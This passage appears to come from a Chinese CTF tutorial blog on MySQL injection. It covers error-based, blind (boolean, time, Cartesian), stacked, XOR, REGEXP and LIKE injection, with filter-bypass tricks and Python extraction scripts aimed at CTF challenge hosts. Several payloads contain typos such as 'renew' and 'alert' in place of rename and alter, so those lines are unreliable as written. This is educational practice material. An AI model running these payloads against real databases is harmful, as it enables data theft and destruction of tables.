class="hljs-string">&#x27;~&#x27;</span>,(<span class="hljs-keyword">select</span> group_concat(table_name</span>) <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_schema</span>=database())),<span class="hljs-number">1</span>)<span class="hljs-meta">#</span><br>爆列名<br>?id=<span class="hljs-number">1</span> <span class="hljs-function"><span class="hljs-keyword">and</span> <span class="hljs-title">updatexml</span>(<span class="hljs-params"><span class="hljs-number">1</span>,make_set(<span class="hljs-number">3</span>,<span class="hljs-string">&#x27;~&#x27;</span>,(<span class="hljs-keyword">select</span> group_concat(column_name</span>) <span class="hljs-keyword">from</span> information_schema.columns <span class="hljs-keyword">where</span> table_name</span>=<span class="hljs-string">&quot;users&quot;</span>)),<span class="hljs-number">1</span>)<span class="hljs-meta">#</span><br>爆字段<br>?id=<span class="hljs-number">1</span> <span class="hljs-function"><span class="hljs-keyword">and</span> <span class="hljs-title">updatexml</span>(<span class="hljs-params"><span class="hljs-number">1</span>,make_set(<span class="hljs-number">3</span>,<span class="hljs-string">&#x27;~&#x27;</span>,(<span class="hljs-keyword">select</span> data <span class="hljs-keyword">from</span> users</span>)),1)#</span><br></code></pre></td></tr></table></figure><p>这就是报错注入，一般只要有报错，直接报错注入，很好用，过滤的话就是过滤and吧，</p><p>我们可以尝试大写绕过例如：And</p><p>或者两次的url加密</p><p>或者</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">/!**and**/</span><br></code></pre></td></tr></table></figure><p>或者使用 || 和 &amp;&amp;(这个非常好用)</p><p>差不多报错就这些吧</p><p>补充：因为报错有字数限制，所以有时候获得的flag只有前面一般，所以我们还需要用到<code>left() right()</code></p><p>例如：(过滤了空格，等号)</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql">admin<span class="hljs-operator">%</span><span class="hljs-number">27</span><span class="hljs-operator">^</span>updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,(<span class="hljs-keyword">select</span>(<span class="hljs-keyword">left</span>(password,<span class="hljs-number">30</span>))<span class="hljs-keyword">from</span>(H4rDsq1))),<span class="hljs-number">1</span>)<span class="hljs-operator">%</span><span class="hljs-number">23</span><br>admin<span class="hljs-operator">%</span><span class="hljs-number">27</span><span class="hljs-operator">^</span>updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,(<span class="hljs-keyword">select</span>(<span class="hljs-keyword">right</span>(password,<span class="hljs-number">30</span>))<span class="hljs-keyword">from</span>(H4rDsq1))),<span class="hljs-number">1</span>)<span class="hljs-operator">%</span><span class="hljs-number">23</span><br></code></pre></td></tr></table></figure><p>然后拼接起来就是了</p><p>flag{88ef73bf-fe5a-403e-a0a9-033a81b94d30}</p><p>有时候还需要用到<code>reverse</code> 逆序输出</p><p>例如<code>[RCTF2015]EasySQL</code>：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">username<span class="hljs-operator">=</span>w0s1np&quot;||(updatexml(1,concat(0x3a,reverse((select(group_concat(real_flag_1s_here))from(users)where(real_flag_1s_here)regexp(&#x27;f&#x27;))),1))#<br></code></pre></td></tr></table></figure><p>报错使用的时候</p><table><thead><tr><th align="left"></th><th align="left"></th><th align="left"></th><th align="left"></th><th align="left"></th><th align="center"></th><th align="left"></th><th align="left"></th><th align="left"></th><th align="left"></th></tr></thead><tbody><tr><td align="left">类别</td><td align="left">函数</td><td align="left">版本需求</td><td align="left">5.5.x</td><td align="left">5.6.x</td><td align="center">5.7.x</td><td align="left">8.x</td><td align="left">函数显错长度</td><td align="left">Mysql报错内容长度</td><td align="left">额外限制</td></tr><tr><td align="left">主键重复</td><td align="left">floor round</td><td align="left">❓</td><td align="left">✔️</td><td align="left">✔️</td><td align="center">✔️</td><td align="left"></td><td align="left">64</td><td align="left"></td><td align="left">data_type ≠ varchar</td></tr><tr><td align="left">列名重复</td><td align="left">name_const</td><td align="left">❓</td><td align="left">✔️</td><td align="left">✔️</td><td align="center">✔️</td><td align="left">✔️</td><td align="left"></td><td align="left"></td><td align="left">only version()</td></tr><tr><td align="left">列名重复</td><td align="left">join</td><td align="left">[5.5.49, ?)</td><td align="left">✔️</td><td align="left">✔️</td><td align="center">✔️</td><td align="left">✔️</td><td align="left"></td><td align="left"></td><td align="left">only columns</td></tr><tr><td align="left">数据溢出 - Double</td><td align="left">1e308 cot exp pow</td><td align="left">[5.5.5, 5.5.48]</td><td align="left">✔️</td><td align="left"></td><td align="center"></td><td align="left"></td><td align="left"></td><td align="left">MYSQL_ERRMSG_SIZE</td><td align="left"></td></tr><tr><td align="left">数据溢出 - BIGINT</td><td align="left">1+~0</td><td align="left">[5.5.5, 5.5.48]</td><td align="left">✔️</td><td align="left"></td><td align="center"></td><td align="left"></td><td align="left"></td><td align="left">MYSQL_ERRMSG_SIZE</td><td align="left"></td></tr><tr><td align="left">几何对象</td><td align="left">geometrycollection linestring multipoint multipolygon multilinestring polygon</td><td align="left">[?, 5.5.48]</td><td align="left">✔️</td><td align="left"></td><td align="center"></td><td align="left"></td><td align="left"></td><td align="left">244</td><td align="left"></td></tr><tr><td align="left">空间函数 Geohash</td><td align="left">ST_LatFromGeoHash ST_LongFromGeoHash ST_PointFromGeoHash</td><td align="left">[5.7, ?)</td><td align="left"></td><td align="left"></td><td align="center">✔️</td><td align="left">✔️</td><td align="left">128</td><td align="left"></td><td align="left"></td></tr><tr><td align="left">GTID</td><td align="left">gtid_subset gtid_subtract</td><td align="left">[5.6.5, ?)</td><td align="left"></td><td align="left">✔️</td><td align="center">✔️</td><td align="left">✔️</td><td align="left">200</td><td align="left"></td><td align="left"></td></tr><tr><td align="left">JSON</td><td align="left">json_*</td><td align="left">[5.7.8, 5.7.11]</td><td align="left"></td><td align="left"></td><td align="center">✔️</td><td align="left"></td><td align="left">200</td><td align="left"></td><td align="left"></td></tr><tr><td align="left">UUID</td><td align="left">uuid_to_bin bin_to_uuid</td><td align="left">[8.0, ?)</td><td align="left"></td><td align="left"></td><td align="center"></td><td align="left">✔️</td><td align="left">128</td><td align="left"></td><td align="left"></td></tr><tr><td align="left">XPath</td><td align="left">extractvalue updatexml</td><td align="left">[5.1.5, ?)</td><td align="left">✔️</td><td align="left">✔️</td><td align="center">✔️</td><td align="left">✔️</td><td align="left">32</td><td align="left"></td><td align="left"></td></tr></tbody></table><p>当遇到没回显，不报错怎么办</p><h3 id="无回显无报错的盲注"><a href="#无回显无报错的盲注" class="headerlink" title="无回显无报错的盲注"></a>无回显无报错的盲注</h3><p>常见盲注方法：布尔盲注，时间盲注，状态码注入，笛卡尔积盲注</p><p>布尔盲注：<code>if(ascii(substr(database(),1,1))&gt;1,1,0)</code></p><p>时间盲注：<code>if(ascii(substr(database(),1,1))=114,1,sleep(5))</code></p><p>状态码盲注：<code>if((select ascii(substr(database(),1,1)))&gt;1,1,(select 1 from mysql.user))</code></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> if((<span class="hljs-keyword">select</span> <span class="hljs-number">1</span>), <span class="hljs-number">1</span>, (<span class="hljs-keyword">select</span> <span class="hljs-number">1</span> <span class="hljs-keyword">from</span> mysql.user));<br># 输出: <span class="hljs-number">1</span><br><br><span class="hljs-keyword">select</span> if((<span class="hljs-keyword">select</span> <span class="hljs-number">0</span>), <span class="hljs-number">1</span>, (<span class="hljs-keyword">select</span> <span class="hljs-number">1</span> <span class="hljs-keyword">from</span> mysql.user));<br># 报错: ERROR <span class="hljs-number">1242</span> (<span class="hljs-number">21000</span>): Subquery <span class="hljs-keyword">returns</span> more than <span class="hljs-number">1</span> <span class="hljs-type">row</span><br></code></pre></td></tr></table></figure><p>笛卡尔积延时注入：（原理：<code>count(*)</code> 后面所有表中的列笛卡尔积数，数量越多越卡，就会有延迟，从而达到延时注入的效果）</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs sql">username<span class="hljs-operator">=</span>whoami<span class="hljs-operator">&amp;</span>password<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27; and if((select 1),(SELECT count(*) FROM information_schema.columns A, information_schema.columns B, information_schema.tables C),0);#</span><br><span class="hljs-string">[OUTPUT:]</span><br><span class="hljs-string">HTTP/1.1 504 Gateway Time-out    # 有很长的延时, 以至于Time-out了</span><br><span class="hljs-string"></span><br><span class="hljs-string">username=whoami&amp;password=1&#x27;</span> <span class="hljs-keyword">and</span> if((<span class="hljs-keyword">select</span> <span class="hljs-number">0</span>),(<span class="hljs-keyword">SELECT</span> <span class="hljs-built_in">count</span>(<span class="hljs-operator">*</span>) <span class="hljs-keyword">FROM</span> information_schema.columns A, information_schema.columns B, information_schema.tables C),<span class="hljs-number">0</span>);#<br>[OUTPUT:]<br>HTTP<span class="hljs-operator">/</span><span class="hljs-number">1.1</span> <span class="hljs-number">200</span>    # 没有延时<br></code></pre></td></tr></table></figure><p>这里放一个盲注脚本吧，可以根据题目自行修改：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br>url = <span class="hljs-string">&quot;http://e3a1c4b6-8190-40c1-86c3-890c11354d89.node3.buuoj.cn/?stunum=&quot;</span><br><br>result = <span class="hljs-string">&quot;&quot;</span><br>i = <span class="hljs-number">0</span><br><br><span class="hljs-keyword">while</span>( <span class="hljs-literal">True</span> ):<br>i = i + <span class="hljs-number">1</span> <br>head=<span class="hljs-number">32</span><br>tail=<span class="hljs-number">127</span><br><br><span class="hljs-keyword">while</span>( head &lt; tail ):<br>mid = (head + tail) &gt;&gt; <span class="hljs-number">1</span><br><br><span class="hljs-comment">#payload = &quot;if(ascii(substr(database(),%d,1))&gt;%d,1,0)&quot; % (i , mid)</span><br><span class="hljs-comment">#payload = &quot;if(ascii(substr((select/**/group_concat(table_name)from(information_schema.tables)where(table_schema=database())),%d,1))&gt;%d,1,0)&quot; % (i , mid)</span><br>payload = <span class="hljs-string">&quot;if(ascii(substr((select/**/group_concat(value)from(ctf.flag)),%d,1))&gt;%d,1,0)&quot;</span> % (i , mid)<br><br>r = requests.get(url+payload)<br>r.encoding = <span class="hljs-string">&quot;utf-8&quot;</span><br><span class="hljs-comment">#print(url+payload)</span><br><span class="hljs-keyword">if</span> <span class="hljs-string">&quot;your score is: 100&quot;</span> <span class="hljs-keyword">in</span> r.text :<br>head = mid + <span class="hljs-number">1</span><br><span class="hljs-keyword">else</span>:<br><span class="hljs-comment">#print(r.text)</span><br>tail = mid<br><br>last = result<br><br><span class="hljs-keyword">if</span> head!=<span class="hljs-number">32</span>:<br>result += <span class="hljs-built_in">chr</span>(head)<br><span class="hljs-keyword">else</span>:<br><span class="hljs-keyword">break</span><br><span class="hljs-built_in">print</span>(result)<br></code></pre></td></tr></table></figure><h3 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="堆叠注入"></a>堆叠注入</h3><p>常见修改数据库语句：</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">create</span> <span class="hljs-keyword">database</span> - 创建新数据库<br>alert <span class="hljs-keyword">database</span>- 修改数据库<br>creat <span class="hljs-keyword">table</span> - 创建新表<br>alert <span class="hljs-keyword">table</span> - 变更（改变）数据库表<br><span class="hljs-keyword">drop</span> <span class="hljs-keyword">table</span> - 删除表<br>creat <span class="hljs-keyword">index</span> - 创建索引（搜索键）<br><span class="hljs-keyword">drop</span> <span class="hljs-keyword">index</span> - 删除索引<br></code></pre></td></tr></table></figure><p>之前都没咋用到过，就是在<code>随便注</code>里面出现才学习了下，这里就以该题为例：</p><p>  <img src="https://s3.ax1x.com/2020/11/28/DsGjQP.png" alt="fef"></p><p>  尝试了下，有回显，有报错，直接union注入，通过order by字段为2；结果发现：</p><p>  <img src="https://s3.ax1x.com/2020/11/28/DsJPij.png" alt="dwa"></p><p>  过滤了select,这就难搞了，你要获得最后字段的结果都需要用到<code>select</code>呀，就需要用到堆叠了</p><p>爆表，爆表，</p><figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs gauss"><span class="hljs-number">1</span>&#x27;;<span class="hljs-keyword">show</span> databases<span class="hljs-meta">#</span><br><span class="hljs-number">1</span>&#x27;;<span class="hljs-keyword">show</span> tables<span class="hljs-meta">#</span><br></code></pre></td></tr></table></figure><p>  <img src="https://s3.ax1x.com/2020/11/28/DsJQY9.png" alt="awff"></p><p>  两个表，然后输出列，</p>  <figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs applescript"><span class="hljs-number">1</span>&#x27;;show columns <span class="hljs-keyword">from</span> <span class="hljs-built_in">words</span>;<span class="hljs-comment">#</span><br></code></pre></td></tr></table></figure><p>  <img src="https://s3.ax1x.com/2020/11/28/DsJNwD.png" alt="fwwef"></p>  <figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs applescript"><span class="hljs-number">1</span>&#x27;;show columns <span class="hljs-keyword">from</span> `<span class="hljs-number">1919810931114514</span>`;<span class="hljs-comment">#</span><br></code></pre></td></tr></table></figure><p>  <img src="https://s3.ax1x.com/2020/11/28/DsJwYd.png" alt="fae"></p><p>因为正常输入个1得到的是1和<code>hahaha</code>，如果默认查询<code>19.....</code>表名的字段，那么就会显示<code>flag</code>了，所以这里默认查询<code>word</code>表名的字段，因为也不能<code>select</code>，只有通过修改表名，把<code>19....</code>当成默认的，这里就需要<code>renew</code>和<code>alert（alert 添加、修改、删除字段）</code>了，首先我们需要把<code>word</code>表名让出来，所以先来<code>1&#39;;renew tables &#39;word&#39; to &#39;word1&#39;;</code>再把<code>19....</code>换成<code>word1</code>   <code>1&#39;;renew tables &#39;word&#39; to &#39;word1&#39;;renew tables &#39;19....&#39; to &#39;word&#39;;</code>因为<code>19....</code>表少了一个列，所以要添加一个，所以使用<code>alert table &#39;word&#39; change &#39;flag&#39; &#39;id&#39; varchar(100)#</code>,所以总的payload如下：</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver"><span class="hljs-number">1</span><span class="hljs-string">&#x27;;renew tables &#x27;</span><span class="hljs-built_in">word</span><span class="hljs-string">&#x27; to &#x27;</span>word1<span class="hljs-string">&#x27;;renew tables &#x27;</span><span class="hljs-number">19.</span>..<span class="hljs-string">&#x27; to &#x27;</span><span class="hljs-built_in">word</span><span class="hljs-string">&#x27;;alert table &#x27;</span><span class="hljs-built_in">word</span><span class="hljs-string">&#x27; change &#x27;</span>flag<span class="hljs-string">&#x27; &#x27;</span>id<span class="hljs-string">&#x27; varchar(100)#</span><br></code></pre></td></tr></table></figure><p> 所以我们只要输入万能密码进去即可：1’ or ‘1’=’1</p><p>  <img src="https://s3.ax1x.com/2020/11/28/DsY1Ag.png" alt="fesf"></p><p>感觉难得就是想到默认表名和换表名了。值得思考下renew和alert。这里记一下他们的作用：</p><p>rename - 重命名</p><figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs autohotkey">rename tables `words` to `word1`<br></code></pre></td></tr></table></figure><p>重命名表<code>words</code>为<code>word1</code></p><p>alter - 变更列</p><figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs autohotkey">alter table `words` change `flag` `id` varchar(<span class="hljs-number">100</span>)<br></code></pre></td></tr></table></figure><p>变更表<code>words</code>中的列<code>flag</code>为<code>id</code> 且其性质为<code>varchar(100)</code></p><p>mysql</p><ol><li><p>创建表：</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> users <span class="hljs-keyword">where</span> id=<span class="hljs-number">1</span>;creat <span class="hljs-keyword">table</span> test <span class="hljs-keyword">like</span> users;<br></code></pre></td></tr></table></figure></li><li><p>删除表</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> users <span class="hljs-keyword">where</span> id=<span class="hljs-number">1</span>;<span class="hljs-keyword">drop</span> <span class="hljs-keyword">table</span> test;<br></code></pre></td></tr></table></figure></li><li><p>查询数据</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">select</span> * from users where id=<span class="hljs-number">1</span>;select <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>;<br></code></pre></td></tr></table></figure></li><li><p>修改数据</p><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs n1ql"><span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> users <span class="hljs-keyword">where</span> id=<span class="hljs-number">1</span>;<span class="hljs-keyword">insert</span> <span class="hljs-keyword">into</span> users(id,username,<span class="hljs-keyword">password</span>) <span class="hljs-keyword">values</span>(<span class="hljs-string">&#x27;100&#x27;</span>,<span class="hljs-string">&#x27;new&#x27;</span>,<span class="hljs-string">&#x27;new&#x27;</span>)<br></code></pre></td></tr></table></figure></li></ol><p>该题还有一种方式，就是使用PDO预编译</p><p>MySQL的预编译语法为：</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">set</span>用于设置变量名和值<br><span class="hljs-keyword">prepare</span>用于预备一个语句，并赋予名称，以后可以引用该语句<br><span class="hljs-keyword">execute</span>执行语句<br><span class="hljs-keyword">deallocate</span> <span class="hljs-keyword">prepare</span>用来释放掉预处理的语句<br></code></pre></td></tr></table></figure><p>直接payload：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">-1</span><span class="hljs-string">&#x27;;set @sql = CONCAT(&#x27;</span>se<span class="hljs-string">&#x27;,&#x27;</span>lect <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> `<span class="hljs-number">1919810931114514</span>`;<span class="hljs-string">&#x27;);prepare stmt from @sql;EXECUTE stmt;#</span><br></code></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs mysql">拆分开来如下<br>-1&#39;;<br>set @sql &#x3D; CONCAT(&#39;se&#39;,&#39;lect * from &#96;1919810931114514&#96;;&#39;);<br>prepare stmt from @sql;<br>EXECUTE stmt;<br>#<br></code></pre></td></tr></table></figure><h3 id="异或注入"><a href="#异或注入" class="headerlink" title="异或注入"></a>异或注入</h3><p>其实也就相当于盲注，就是当and or这些逻辑运算符被过滤了的时候使用</p><p>两个同为真的条件做异或，结果为假</p><p>两个同为假的条件做异或，结果为假</p><p>一个条件为真，一个条件为假，结果为真</p><p><code>null</code>与任何条件（真、假、null）做异或，结果都为<code>null</code></p><p>基本payload:</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">admin<span class="hljs-string">&#x27;^(ascii(mid((password)from(i)))&gt;j)^&#x27;</span><span class="hljs-number">1</span><span class="hljs-string">&#x27;=&#x27;</span><span class="hljs-number">1</span><span class="hljs-string">&#x27;%23</span><br></code></pre></td></tr></table></figure><p>最前面和最后面的语句都固定为真（逻辑结果都为1），只有中间的语句不确定真假</p><p><strong>那么整个payload的逻辑结果都由中间的语句决定</strong>，我们就可以用这个特性来判断盲注的结果了</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">0</span>^<span class="hljs-number">1</span>^<span class="hljs-number">0</span> --&gt; <span class="hljs-number">1</span> 语句返回为真<br><span class="hljs-attribute">0</span>^<span class="hljs-number">0</span>^<span class="hljs-number">0</span> --&gt; <span class="hljs-number">0</span> 语句返回为假<br></code></pre></td></tr></table></figure><p>就可以以此构招脚本跑了</p><p>例如：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><br>url = <span class="hljs-string">&quot;http://web43.buuoj.cn/index.php&quot;</span><br><br>result = <span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">38</span>):<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-number">256</span>):<br>        payload = <span class="hljs-string">&#x27;1^(cot(ascii(substr((select(flag)from(flag)),&#x27;</span> + <span class="hljs-built_in">str</span>(i) + <span class="hljs-string">&#x27;,1))&gt;&#x27;</span> + <span class="hljs-built_in">str</span>(j) + <span class="hljs-string">&#x27;))^1=1&#x27;</span><br>        <span class="hljs-built_in">print</span>(payload)<br>        r = requests.post(url, data = &#123;<span class="hljs-string">&#x27;id&#x27;</span>: payload&#125;)<br><br>        <span class="hljs-keyword">if</span> r.text.find(<span class="hljs-string">&#x27;girl&#x27;</span>) == -<span class="hljs-number">1</span>:<br>            result += <span class="hljs-built_in">chr</span>(j)<br>            <span class="hljs-built_in">print</span>(j)<br>            <span class="hljs-keyword">break</span><br><br><span class="hljs-built_in">print</span>(result)<br></code></pre></td></tr></table></figure><p>这是<code>[CISCN2019 华北赛区 Day2 Web1]Hack World</code>所需脚本，其中就使用了异或注入payload</p><p>使用场景：</p><p>过滤了<code>and or</code>   <code>,（逗号）</code> <code>空格</code></p><h3 id="REGEXP注入"><a href="#REGEXP注入" class="headerlink" title="REGEXP注入"></a>REGEXP注入</h3><p>就是regexp正则注入</p><ol><li><h4 id="基本注入"><a href="#基本注入" class="headerlink" title="基本注入"></a>基本注入</h4></li></ol><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs autoit"><span class="hljs-keyword">select</span> (<span class="hljs-keyword">select</span> 语句) regexp <span class="hljs-string">&#x27;正则&#x27;</span><br></code></pre></td></tr></table></figure><p>a.正则注入</p><p>当匹配则返回1，未匹配则返回0</p><p><img src="https://s3.ax1x.com/2020/12/25/rWMEsU.png" alt="faw"></p><p><img src="https://s3.ax1x.com/2020/12/25/rWMmdJ.png" alt="gr"></p><p>所以username里面第一个字符为1</p><p>b.regexp代替where里面的 =</p><p><img src="https://s3.ax1x.com/2020/12/25/rWl1bD.png" alt="gdr"></p><p>若<code> ^</code>被过滤了，我们也可以使用<code> $</code>来从后往前进行匹配</p><p><img src="https://s3.ax1x.com/2020/12/25/rW31tH.png" alt="gerd"></p><p>c.在联合注入中使用</p><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs basic"><span class="hljs-symbol">1 </span>union select <span class="hljs-number">1</span>,database() regexp <span class="hljs-comment">&#x27;^s&#x27;,3 --+</span><br></code></pre></td></tr></table></figure><ol start="2"><li><h4 id="REGEXP盲注"><a href="#REGEXP盲注" class="headerlink" title="REGEXP盲注"></a>REGEXP盲注</h4><p>payload:</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 1c">&#x27; or database() regexp &#x27;^s&#x27;--+<br></code></pre></td></tr></table></figure><p>脚本如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> string<br><br>strs = string.printable<br>url = <span class="hljs-string">&quot;...?id=&quot;</span><br><br>database1 = <span class="hljs-string">&quot;&#x27; or database() regexp &#x27;^&#123;&#125;&#x27;--+&quot;</span><br>table1 = <span class="hljs-string">&quot;&#x27; or (select table_name from information_schema.tables where table_schema=database()limit 0,1) regexp &#x27;^&#123;&#125;&#x27;--+&quot;</span><br>cloumn1 = <span class="hljs-string">&quot;&#x27; or (select cloumn_name from information_schema.cloumns where table_name=&#x27;&#x27; and table_schema=database()limit 0,1) regexp &#x27;^&#123;&#125;&#x27;--+&quot;</span><br>data1 = <span class="hljs-string">&quot;&#x27; or (select username from users limit 0,1) regexp &#x27;^&#123;&#125;&#x27;--+&quot;</span><br><br>payload = database1<br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    name = <span class="hljs-string">&#x27;&#x27;</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">40</span>):<br>        char = <span class="hljs-string">&#x27;&#x27;</span><br>        <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> strs:<br>            payloads = payload.<span class="hljs-built_in">format</span>(name+j)<br>            urls = url+payloads<br>            r = requests.get(urls)<br>            <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;You are in&quot;</span> <span class="hljs-keyword">in</span> r.text:<br>                name += j<br>                <span class="hljs-built_in">print</span>(j,end=<span class="hljs-string">&#x27;&#x27;</span>)<br>                char = j<br>                <span class="hljs-keyword">break</span><br>         <span class="hljs-keyword">if</span> char == <span class="hljs-string">&#x27;#&#x27;</span>:<br>            <span class="hljs-keyword">break</span><br></code></pre></td></tr></table></figure><p>使用场景：</p><p>过滤了<code>= in like</code></p></li></ol><p>这里还有一个小<code>trick</code>，就是在注入语句后面添加<code>regexp+正则表达式</code>来过滤查询出的内容：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">(updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x3a</span>,(<span class="hljs-keyword">select</span>(group_concat(real_flag_1s_here))<span class="hljs-keyword">from</span>(users)<span class="hljs-keyword">where</span>(real_flag_1s_here)regexp(<span class="hljs-string">&#x27;^f&#x27;</span>))),<span class="hljs-number">1</span>))#<br></code></pre></td></tr></table></figure><p>筛选出以f开头的结果</p><h3 id="LIKE注入"><a href="#LIKE注入" class="headerlink" title="LIKE注入"></a>LIKE注入</h3><ol><li><p>基本注入</p><p>a.<code>like &#39;wo%&#39;</code>判断前面两个字符是否为wo</p><p>​    <img src="https://s3.ax1x.com/2020/12/25/rWaBpF.png" alt="grhs"></p><p>b.<code>like &#39;%wo%&#39;</code>判断是否包含wo这两个字符</p><p><img src="https://s3.ax1x.com/2020/12/25/rWaXh8.png" alt="hgrd"></p><p>c.<code>like &#39;_ _ _ _ _&#39;</code>判断是否为5个字符</p><p>d.<code>like &#39;w_ _ _ _&#39;</code>判断第一个是否为w</p></li><li><p>LIKE盲注</p><p>payload:</p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span 